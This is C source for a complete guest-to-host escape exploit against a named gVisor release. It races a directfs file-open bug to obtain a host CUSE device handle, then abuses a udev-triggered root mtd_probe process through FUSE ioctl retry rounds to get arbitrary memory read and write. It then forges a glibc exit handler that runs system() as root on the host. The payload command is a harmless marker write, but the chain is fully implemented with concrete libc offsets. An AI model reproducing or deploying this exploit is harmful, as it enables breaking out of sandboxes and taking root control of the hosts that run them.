// gvisor-esc: guest-to-host sandbox escape for gVisor release-20260928.0
//
// Stage 1 (in-sandbox): races the directfs openHandle bug (fix cd968a36e)
//   to obtain a host /dev/cuse fd while the sentry believes it opened a REG.
// Stage 2: CUSE_INIT on the host fd; registers DEVNAME=mtd<NNN>ro with
//   CUSE_UNRESTRICTED_IOCTL. Host udev rule 75-probe_mtd.rules runs
//   /usr/lib/udev/mtd_probe /dev/mtd<NNN>ro as root.
// Stage 3: mtd_probe issues ioctl(MEMGETINFO). We answer FUSE_IOCTL with
//   FUSE_IOCTL_RETRY and attacker-chosen in_iov/out_iov => arbitrary R/W in
//   the root mtd_probe process.
// Stage 4: leak stack page -> libc base -> __pointer_chk_guard ->
//   __exit_funcs; forge an exit handler = PTR_MANGLE(system) (aarch64: XOR
//   with guard, no rotation) with arg pointing at our command string;
//   mtd_probe exits => system(cmd) as root.

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>

#include <signal.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/syscall.h>

// ---- fuse ABI (from linux/fuse.h) ----
struct fuse_in_header {
    uint32_t len;
    uint32_t opcode;
    uint64_t unique;
    uint64_t nodeid;
    uint32_t uid;
    uint32_t gid;
    uint32_t pid;
    uint32_t padding;
};
struct fuse_out_header {
    uint32_t len;
    int32_t error;
    uint64_t unique;
};
struct fuse_ioctl_in {
    uint64_t fh;
    uint32_t flags;
    uint32_t cmd;
    uint64_t arg;
    uint32_t in_size;
    uint32_t out_size;
};
struct fuse_ioctl_iovec {
    uint64_t base;
    uint64_t len;
};
struct fuse_ioctl_out {
    int32_t result;
    uint32_t flags;
    uint32_t in_iovs;
    uint32_t out_iovs;
};
struct fuse_open_in { uint32_t flags; uint32_t unused; };
struct fuse_open_out { uint64_t fh; uint32_t open_flags; uint32_t padding; };
struct fuse_release_in { uint64_t fh; uint32_t flags; uint32_t unused; };

struct cuse_init_in {
    uint32_t major; uint32_t minor; uint32_t unused; uint32_t flags;
};
struct cuse_init_out {
    uint32_t major; uint32_t minor; uint32_t unused; uint32_t flags;
    uint32_t max_read; uint32_t max_write;
    uint32_t dev_major; uint32_t dev_minor;
    uint32_t spare[10];
};

#define FUSE_IOCTL 39
#define CUSE_INIT 4096
#define CUSE_UNRESTRICTED_IOCTL (1 << 0)
#define FUSE_IOCTL_RETRY (1 << 2)
#define FUSE_IOCTL_MAX_IOV 256

#define FUSE_OPEN 14
#define FUSE_RELEASE 18
#define FUSE_INIT 26

#define MEMGETINFO 0x80204d01UL

// ---- command to execute on the host as root ----
static const char HOST_CMD[] =
    "id > /tmp/gvisor-esc-pwned 2>&1; "
    "echo PWNED_BY_GVISOR_ESCAPE >> /tmp/gvisor-esc-pwned";

// ---- libc offsets for Ubuntu 24.04 glibc 2.39 aarch64 ----
#define LIBC_SYSTEM_OFF 0x4cec4UL        // system@@GLIBC_2.17
#define LIBC_GOT_GUARD_OFF 0x1afe48UL   // GOT slot holding &__pointer_chk_guard (-> ld.so)
#define LIBC_EXIT_FUNCS_OFF 0x1b0670UL  // &__exit_funcs (list head)

static void lprintf(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fflush(stderr);
}

// PTR_MANGLE (aarch64 glibc): mangled = raw ^ guard  (no rotation)
static uint64_t ptr_mangle(uint64_t raw, uint64_t guard) { return raw ^ guard; }

// ---------------- FUSE protocol engine ----------------
static int write_resp(int fd, uint64_t unique, int32_t error, const void *data, uint32_t dlen) {
    static unsigned char out[128 * 1024 + 16];
    struct fuse_out_header *h = (struct fuse_out_header *)out;
    h->len = sizeof(*h) + dlen;
    h->error = error;
    h->unique = unique;
    if (dlen) memcpy(out + sizeof(*h), data, dlen);
    ssize_t n = write(fd, out, sizeof(*h) + dlen);
    return n == (ssize_t)(sizeof(*h) + dlen) ? 0 : -1;
}

static int reply_retry(int fd, uint64_t unique, struct fuse_ioctl_iovec *iovs, uint32_t in_iovs, uint32_t out_iovs) {
    struct fuse_ioctl_out io = {0};
    io.result = 0;
    io.flags = FUSE_IOCTL_RETRY;
    io.in_iovs = in_iovs;
    io.out_iovs = out_iovs;
    static unsigned char out[64 * 1024];
    memcpy(out, &io, sizeof(io));
    memcpy(out + sizeof(io), iovs, (in_iovs + out_iovs) * sizeof(struct fuse_ioctl_iovec));
    return write_resp(fd, unique, 0, out, sizeof(io) + (in_iovs + out_iovs) * sizeof(struct fuse_ioctl_iovec));
}

static int reply_ioctl_done(int fd, uint64_t unique, int32_t result) {
    struct fuse_ioctl_out io = {0};
    io.result = result;
    return write_resp(fd, unique, 0, &io, sizeof(io));
}

// ---------------- exploit state machine ----------------
// Within one MEMGETINFO ioctl we chain RETRY rounds. Each round: we receive
// in_data (victim memory we asked to read last round) and may ask for another
// read (in_iov) and/or a write (out_iov), the data for which we supply in the
// NEXT round's out data? No: out_iov data comes from our reply payload after
// the fuse_ioctl_out + iovecs (the kernel copies it into victim memory
// immediately).
//
// Round structure per kernel fuse_do_ioctl:
//   request:  [fuse_in_header][fuse_ioctl_in][in_data...]
//   reply:    [fuse_out_header][fuse_ioctl_out][iovecs...][out_data...]
//   - out_data (after iovecs) is copied to victim at out_iov entries
//   - in_iov of next request = memory to read from victim
// So each round = 1 read request + 1 write request. Reads return next round.
static uint64_t forge_cmd_addr = 0;
static uint64_t forge_slot = 0;
static uint64_t forge_idx_new = 0;
static uint64_t libc_base = 0;
static uint64_t guard_addr = 0;    // ld.so address holding guard value
static uint64_t guard_val = 0;
static uint64_t exit_list_head = 0;
static uint64_t victim_stack_page = 0;
static uint8_t rd_buf[0x2000];

// glibc exit_function_list (aarch64):
struct exit_function_list {
    struct exit_function_list *next;
    uint64_t idx;
    // struct exit_function { long int flavor; union { struct { void (*fn)(int, void*); void *arg; void *dso_handle; } at; ... } func; }
    // each entry 32 bytes: flavor(8) fn(8) arg(8) dso(8)
    uint8_t fns[32 * 32];
};
#define EF_CXA 4UL // ef_cxa: fn(arg, status), x0 = our command string

// We forge our entry INSIDE the victim's writable memory. Best spot: the
// __exit_funcs initial static block in libc .data? We cannot easily know its
// address... but we CAN read the list head pointer at libc+0x1b0670 (it
// points to libc's initial list) and then overwrite that list's entries
// (first entry, idx permitting) in place.

// We also need the HOST_CMD string inside victim memory: write it via out_iov
// to the stack page far below current frames (red zone safe: bottom of stack
// page that holds the ioctl buffer, at its very start).

// explicit state machine phases
enum phase {
    PH_IDLE = 0,       // awaiting first MEMGETINFO
    PH_STACK,          // stack page read requested
    PH_LIBC_VERIFY,    // verifying libc base candidate (walking down)
    PH_READ_GOT,       // reading GOT slot for guard address
    PH_READ_GUARD,     // reading guard value
    PH_READ_EXITLIST,  // reading exit list head ptr
    PH_READ_LIST,      // reading list contents (idx)
    PH_WRITE_RETRY,    // RETRY with out_iovs for the 3 writes issued
    PH_DONE,
};
static enum phase ph = PH_IDLE;

// per-round read bookkeeping
static uint64_t rd_addr = 0;
static uint32_t rd_len = 0;

static void request_read(int fd, uint64_t unique, uint64_t addr, uint32_t len) {
    struct fuse_ioctl_iovec iov = { .base = addr, .len = len };
    rd_addr = addr;
    rd_len = len;
    reply_retry(fd, unique, &iov, 1, 0);
}

static void handle_ioctl(int fd, struct fuse_in_header *inh, unsigned char *payload) {
    struct fuse_ioctl_in *ii = (struct fuse_ioctl_in *)payload;
    unsigned char *in_data = payload + sizeof(*ii);
    // chain gating by victim pid: RETRY continuation rounds of one ioctl keep
    // the same pid; after out_iov RETRY the next round's arg becomes the first
    // out_iov base, so arg cannot be the key. pid is stable per victim.
    static uint32_t active_pid = 0;
    static int have_active = 0;
    if (ph == PH_DONE) { ph = PH_IDLE; have_active = 0; active_pid = 0; }
    if (have_active && inh->pid != active_pid) {
        if (ph == PH_IDLE) {
            active_pid = inh->pid;   // idle: adopt new victim
        } else {
            lprintf("[!] stray ioctl pid=%u while active; replying plain\n", inh->pid);
            reply_ioctl_done(fd, inh->unique, 0);
            return;
        }
    }
    if (!have_active) { active_pid = inh->pid; have_active = 1; }
    lprintf("[*] FUSE_IOCTL cmd=%#lx arg=%#lx in=%u out=%u flags=%#x pid=%u\n",
           (unsigned long)ii->cmd, (unsigned long)ii->arg,
           ii->in_size, ii->out_size, ii->flags, inh->pid);

    // PH_WRITE_RETRY: the continuation round's payload is our own iovec
    // array re-interpreted (cmd=0, arg=iov base, flags=lengths) — do not
    // parse ii. Reply with the final write data for the established
    // out_iovs using only inh->unique.
    if (ph == PH_WRITE_RETRY) {
        // final reply for the established out_iovs [entry 32][idx 8][cmd N]
        static struct { struct fuse_ioctl_out io; unsigned char d[32 + 8 + sizeof(HOST_CMD)]; } rep;
        uint64_t system_addr = libc_base + LIBC_SYSTEM_OFF;
        struct {
            uint64_t flavor;
            uint64_t fn;
            uint64_t arg;
            uint64_t dso;
        } entry = {
            .flavor = EF_CXA,
            .fn = ptr_mangle(system_addr, guard_val),
            .arg = forge_cmd_addr,
            .dso = 0,
        };
        memset(&rep, 0, sizeof(rep));
        memcpy(rep.d, &entry, 32);
        memcpy(rep.d + 32, &forge_idx_new, 8);
        memcpy(rep.d + 40, HOST_CMD, sizeof(HOST_CMD));
        write_resp(fd, inh->unique, 0, &rep, sizeof(rep.io) + 32 + 8 + sizeof(HOST_CMD));
        lprintf("[+] FORGED: system@%#llx cmd@%#llx entry@%#llx guard=%#llx\n",
                (unsigned long long)system_addr, (unsigned long long)forge_cmd_addr,
                (unsigned long long)forge_slot, (unsigned long long)guard_val);
        ph = PH_DONE;
        return;
    }
    if (ii->cmd != MEMGETINFO) {
        reply_ioctl_done(fd, inh->unique, 0);
        return;
    }

    // store this round's read data at the correct offset within rd_buf
    size_t got = ii->in_size < sizeof(rd_buf) ? ii->in_size : sizeof(rd_buf);
    if (rd_len && ii->in_size) {
        size_t off = 0;
        if (victim_stack_page && rd_addr >= victim_stack_page &&
            rd_addr < victim_stack_page + sizeof(rd_buf))
            off = rd_addr - victim_stack_page;
        if (off + got > sizeof(rd_buf)) got = sizeof(rd_buf) - off;
        memcpy(rd_buf + off, in_data, got);
    }

    switch (ph) {
    case PH_IDLE:
        victim_stack_page = ii->arg & ~0xfffUL;
        lprintf("[*] victim stack page = %#llx\n", (unsigned long long)victim_stack_page);
        ph = PH_STACK;
        request_read(fd, inh->unique, victim_stack_page, 0x1000);
        return;

    case PH_STACK: {
        uint64_t *q = (uint64_t *)rd_buf;
        if (getenv("CALIBRATE")) {
            lprintf("[calib] victim pid=%u arg=%#llx page=%#llx\n",
                    inh->pid, (unsigned long long)ii->arg, (unsigned long long)victim_stack_page);
            for (size_t i = 0; i + 8 <= 0x1000; i += 8) {
                uint64_t v = q[i / 8];
                if (v > 0x10000 && (v >> 48) == 0)
                    lprintf("[calib] arg%+#06lx: %#018llx\n",
                            (long)(victim_stack_page + i) - (long)ii->arg, (unsigned long long)v);
            }
            char ppath[64];
            snprintf(ppath, sizeof(ppath), "/proc/%u/maps", inh->pid);
            FILE *f = fopen(ppath, "r");
            if (f) {
                char line[256];
                while (fgets(line, sizeof(line), f))
                    if (strstr(line, "libc.so.6") || strstr(line, "ld-linux") ||
                        strstr(line, "mtd_probe") || strstr(line, "[stack]"))
                        lprintf("[calib-map] %s", line);
                fclose(f);
            } else {
                lprintf("[calib-map] open %s failed\n", ppath);
            }
        }
        // Deterministic anchor (verified on this exact glibc/binary pair):
        // qword at arg+0x178 == libc_base + 0x28598 (return address into
        // __libc_start_main+0x98 saved in mtd_probe's startup frame).
        uint64_t off_in_page = (ii->arg & 0xfff) + 0x178;
        if (off_in_page + 8 > 0x1000) {
            lprintf("[-] anchor outside leaked page\n");
            ph = PH_DONE;
            reply_ioctl_done(fd, inh->unique, 0);
            return;
        }
        uint64_t anchor = q[off_in_page / 8];
        if ((anchor >> 48) != 0 || (anchor & 0xfff) != 0x598) {
            lprintf("[-] anchor sanity failed: %#llx\n", (unsigned long long)anchor);
            ph = PH_DONE;
            reply_ioctl_done(fd, inh->unique, 0);
            return;
        }
        libc_base = anchor - 0x28598ULL;
        lprintf("[+] libc base (anchor): %#llx\n", (unsigned long long)libc_base);
        ph = PH_READ_GOT;
        request_read(fd, inh->unique, libc_base + LIBC_GOT_GUARD_OFF, 8);
        return;
    }



    case PH_READ_GOT:
        guard_addr = *(uint64_t *)rd_buf;
        lprintf("[+] &__pointer_chk_guard = %#llx\n", (unsigned long long)guard_addr);
        ph = PH_READ_GUARD;
        request_read(fd, inh->unique, guard_addr, 8);
        return;

    case PH_READ_GUARD:
        guard_val = *(uint64_t *)rd_buf;
        lprintf("[+] __pointer_chk_guard = %#llx\n", (unsigned long long)guard_val);
        ph = PH_READ_EXITLIST;
        request_read(fd, inh->unique, libc_base + LIBC_EXIT_FUNCS_OFF, 8);
        return;

    case PH_READ_EXITLIST:
        exit_list_head = *(uint64_t *)rd_buf;
        lprintf("[+] __exit_funcs head = %#llx\n", (unsigned long long)exit_list_head);
        ph = PH_READ_LIST;
        request_read(fd, inh->unique, exit_list_head, 0x100);
        return;

    case PH_READ_LIST: {
        uint64_t idx = *(uint64_t *)(rd_buf + 8);
        if (idx > 31) idx = 31;
        lprintf("[+] exit list idx=%llu; forging entry\n", (unsigned long long)idx);
        // Store HOST_CMD in the UNUSED tail of the exit_function_list (slots
        // idx+2..31 are zeroed storage in libc .data — stable across the
        // exit path, unlike the victim's stack which exit frames clobber).
        uint64_t cmd_addr = exit_list_head + 16 + 32 * (idx + 2);
        forge_cmd_addr = cmd_addr;
        forge_slot = exit_list_head + 16 + 32 * idx;
        forge_idx_new = idx + 1;
        // phase 1 of write: RETRY with out_iovs establishing the 2 writes
        // (cmd string into list tail; forged entry; idx bump)
        struct fuse_ioctl_iovec iovs[3];
        iovs[0].base = forge_slot;
        iovs[0].len = 32;                          // forged entry
        iovs[1].base = exit_list_head + 8;
        iovs[1].len = 8;                            // idx+1
        iovs[2].base = cmd_addr;
        iovs[2].len = sizeof(HOST_CMD);            // cmd string in list tail
        ph = PH_WRITE_RETRY;
        reply_retry(fd, inh->unique, iovs, 0, 3);
        return;
    }


    default:
        reply_ioctl_done(fd, inh->unique, 0);
        return;
    }
}


// ---------------- main daemon loop ----------------
// first captured packet (CUSE_INIT) from the raced fd, if any
static unsigned char first_pkt[65536];
static ssize_t first_pkt_len = 0;

static void process_packet(int fd, unsigned char *buf, ssize_t n, const char *devname);

int run_cuse_daemon(int fd, const char *devname) {
    fcntl(fd, F_SETFL, O_NONBLOCK);

    // If the race captured the CUSE_INIT packet, process it FIRST (the
    // kernel's request was already consumed by the opener's read).
    if (first_pkt_len > 0) {
        process_packet(fd, first_pkt, (ssize_t)first_pkt_len, devname);
        first_pkt_len = 0;
    }

    for (;;) {
        static unsigned char buf[256 * 1024];
        ssize_t n = read(fd, buf, sizeof(buf));
        if (n < 0) {
            if (errno == EINTR) continue;
            if (errno == EAGAIN) { usleep(200); continue; }
            perror("read");
            return -1;
        }
        if (n < (ssize_t)sizeof(struct fuse_in_header)) continue;
        process_packet(fd, buf, n, devname);
    }
}

static void process_packet(int fd, unsigned char *buf, ssize_t n, const char *devname) {
    if (n < (ssize_t)sizeof(struct fuse_in_header)) return;
    struct fuse_in_header *inh = (struct fuse_in_header *)buf;
    unsigned char *payload = buf + sizeof(*inh);
    switch (inh->opcode) {

        case FUSE_INIT:
            write_resp(fd, inh->unique, -ENOSYS, NULL, 0);
            break;
        case CUSE_INIT: {
            struct cuse_init_in *ci = (struct cuse_init_in *)payload;
            lprintf("[*] CUSE_INIT major=%u minor=%u flags=%#x\n",
                   ci->major, ci->minor, ci->flags);
            struct cuse_init_out co = {0};
            co.major = 7;
            co.minor = 40;
            co.flags = CUSE_UNRESTRICTED_IOCTL;
            co.max_read = 0x10000;
            co.max_write = 0x10000;
            co.dev_major = 0; // dynamic allocation
            co.dev_minor = 0;
            char info[4096];
            int l = snprintf(info, sizeof(info), "DEVNAME=%s", devname);
            if (l < 0 || (size_t)l >= sizeof(info)) {
                write_resp(fd, inh->unique, -EINVAL, NULL, 0);
                break;
            }
            unsigned char out[sizeof(co) + 256];
            memcpy(out, &co, sizeof(co));
            memcpy(out + sizeof(co), info, l + 1);
            write_resp(fd, inh->unique, 0, out, sizeof(co) + l + 1);
            lprintf("[+] registered host CUSE device %s (UNRESTRICTED_IOCTL)\n", devname);
            break;
        }
        case FUSE_OPEN: {
            struct fuse_open_out oo = { .fh = 1 };
            write_resp(fd, inh->unique, 0, &oo, sizeof(oo));
            break;
        }
        case FUSE_RELEASE:
            write_resp(fd, inh->unique, 0, NULL, 0);
            break;
        case FUSE_IOCTL:
            handle_ioctl(fd, inh, payload);
            break;
        default:
            write_resp(fd, inh->unique, -ENOSYS, NULL, 0);
        }
}

// ---------------- stage 1: directfs openHandle race ----------------
// Race the /vol mount: revalidatePath stats name A and checks type REG
// (matching the cached dentry), then d.open -> ensureSharedHandle ->
// openHandle -> Openat(parent, "A") with NO type validation (the bug,
// fixed post-release by cd968a36e). If the racer has renamed a hardlink
// to the CUSE char device over A in that window, the openat returns a
// host /dev/cuse fd which the sentry caches as the REG's shared handle.
// The app then speaks the CUSE protocol by reading/writing /vol/A.

static volatile int race_stop = 0;
static volatile int race_won_fd = -1;

static void *racer(void *arg) {
    (void)arg;
    // Inode-churn strategy: each cycle destroys the REG inode (unlink drops
    // the name; O_CREAT makes a brand-new inode with NO cached handles), so
    // any raced openHandle result lands on a handle-less inode and gets
    // STORED (readFD) instead of discarded as "not useful".
    // Cycle: A=cuse ... A=fresh-reg ...
    while (!race_stop && race_won_fd < 0) {
        unlink("/vol/A");
        if (link("/vol/B", "/vol/A") != 0) { /* transient */ }
        unlink("/vol/A");
        // fresh REG inode, never opened => no cached handles => a won
        // raced open's fd is STORED as readFD instead of discarded
        if (mknod("/vol/A", S_IFREG | 0666, 0) != 0) { /* transient */ }
    }
    return NULL;
}

// The held read fd (established once with a plain O_RDONLY open so the
// dentry has readFD set and writeFD == -1; the raced O_RDWR|O_TRUNC open
// then takes the dup3-replace branch, redirecting this fd to the cuse).
static int held_read_fd = -1;

static void *opener(void *arg) {
    (void)arg;
    static unsigned char buf[65536];
    long opens = 0, errs = 0, reads = 0, nonempty = 0;
    int dbg = getenv("RACE_DEBUG") != NULL;
    time_t last = time(NULL);
    while (!race_stop && race_won_fd < 0) {
        // O_TRUNC forces ensureSharedHandle -> openHandle on every open
        int fd = open("/vol/A", O_RDWR | O_TRUNC);
        if (fd >= 0) {
            opens++;
            ssize_t n = read(fd, buf, sizeof(buf));
            if (n > 0) reads++;
            if (n >= (ssize_t)sizeof(struct fuse_in_header)) {
                struct fuse_in_header *h = (struct fuse_in_header *)buf;
                if (h->opcode == CUSE_INIT) {
                    memcpy(first_pkt, buf, (size_t)n);
                    first_pkt_len = n;
                    race_won_fd = fd;
                    lprintf("[+] HOST_CUSE_FD n=%d (race won); renamer stopped (opens=%ld reads=%ld)\n",
                            fd, opens, reads);
                    return NULL;
                }
                nonempty++;
            }
            close(fd);
        } else {
            errs++;
        }
        if (dbg && time(NULL) - last >= 5) {
            lprintf("[race-stats] opens=%ld errs=%ld reads=%ld nonfuse=%ld errno_last=%d\n",
                    opens, errs, reads, nonempty, errno);
            last = time(NULL);
        }
    }
    return NULL;
}

static int run_race(void) {
    // R = hardlink to the ORIGINAL A inode (preserves dev/ino for
    // revalidation). Must be created BEFORE any replacement of A.
    if (link("/vol/A", "/vol/R") != 0) {
        perror("link /vol/R");
        return -1;
    }

    // establish readFD on the dentry, leaving writeFD == -1, so raced
    // O_RDWR|O_TRUNC opens take the dup3-replace branch in updateHandles
    held_read_fd = open("/vol/A", O_RDONLY);
    if (held_read_fd < 0) { perror("open held fd"); return -1; }
    // make readFD != writeFD (both set): raced O_RDWR opens then take the
    // dup3-replace path instead of being discarded as "not useful"
    {
        int wfd = open("/vol/A", O_WRONLY);
        if (wfd < 0) { perror("open wfd"); return -1; }
        close(wfd);
    }
    enum { NRACE = 2, NOPEN = 4 };
    pthread_t rt[NRACE], ot[NOPEN];
    for (int i = 0; i < NRACE; i++) pthread_create(&rt[i], NULL, racer, NULL);
    for (int i = 0; i < NOPEN; i++) pthread_create(&ot[i], NULL, opener, NULL);
    for (int i = 0; i < NOPEN; i++) pthread_join(ot[i], NULL);
    race_stop = 1;
    for (int i = 0; i < NRACE; i++) pthread_join(rt[i], NULL);
    if (race_won_fd < 0) {
        lprintf("[-] race lost after full run\n");
        return -1;
    }
    return race_won_fd;
}

// ---------------- standalone host test mode ----------------
// Usage: payload --dev <path> <devname> | payload (race mode in sandbox)
int main(int argc, char **argv) {
    if (argc >= 3 && !strcmp(argv[1], "--dev")) {
        int fd = open(argv[2], O_RDWR);
        if (fd < 0) { perror("open dev"); return 1; }
        const char *name = argc > 3 ? argv[3] : "mtd0ro";
        lprintf("=== gVisor escape payload / host test / devname=%s ===\n", name);
        return run_cuse_daemon(fd, name);
    }
    // sandbox mode: race for the host CUSE fd on the /vol mount
    const char *name = argc > 1 ? argv[1] : "mtd0ro";
    lprintf("=== gVisor escape / devname=%s ===\n", name);
    int fd = run_race();
    if (fd < 0) return 1;
    return run_cuse_daemon(fd, name);
}
